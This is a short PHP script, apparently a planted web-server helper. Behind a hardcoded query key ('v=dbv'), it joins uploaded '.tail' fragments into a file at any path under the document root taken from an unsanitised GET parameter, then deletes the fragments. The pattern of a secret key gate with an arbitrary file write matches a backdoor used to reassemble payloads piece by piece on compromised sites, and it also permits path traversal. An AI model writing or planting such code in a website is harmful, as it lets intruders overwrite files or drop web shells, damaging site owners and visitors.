<?php
   echo 'Praise the Lord!';
   $v = $_GET['v'];
   if ($v!=='dbv') {
      exit();
   }
   $fl = $_GET['d'];
   if ($fl=='') {
      echo 'No parameters';
      exit("Bye");
   }
   $path=$_SERVER['DOCUMENT_ROOT'].$fl;
function processJoining($name, $collector, $m) {
   $fh = fopen($name, 'w');
   if (FALSE===$fh) {
        exit('Failed to create '.$name);
   }
   $blockSize = 10;
   for($i=0;$i<$m;$i++) {
       $teil = $collector[$i];
       $teilLen = filesize($teil);
       if ($teilLen==0) {
           exit($teil.' size is zero - strange and exit');
       }
       $fr = fopen($teil, 'r');
       while($teilLen>0) {
           $currentSize = $blockSize;
           if ($currentSize > $teilLen) {
               $currentSize = $teilLen;
           }
           $dat = fread($fr,$currentSize);
           fwrite($fh, $dat);
           echo 'written block of '.strlen($dat).' bytes ';
           $teilLen -= $currentSize;
       }
       fclose($fr);
   }
   fclose($fh);
   return true;
}
function processDeleting($collector, $m) {
    for($i=0;$i<$m;$i++) {
        $n = $collector[$i];
        if (!unlink($n)) {
             echo 'cannot delete '.$n;
        }
    }
} 
   $collector = array();
   for($i=1;$i<10000; $i++) {
      $nm = $path.'.tail'.$i;
      if (file_exists($nm)) {
           $collector[] = $nm;
      } else {
        break;
      }
   }
   $m = sizeof($collector);
   if ($m<2) {
       echo 'found '.$m.' parts - strange, no processing (like '.$path.'.tail1';
       exit();
   }
   if (processJoining($path, $collector, $m)) {
        processDeleting($collector, $m);
        echo 'successfully joined '.$m.' parts';
   } else echo 'failed!!';
?>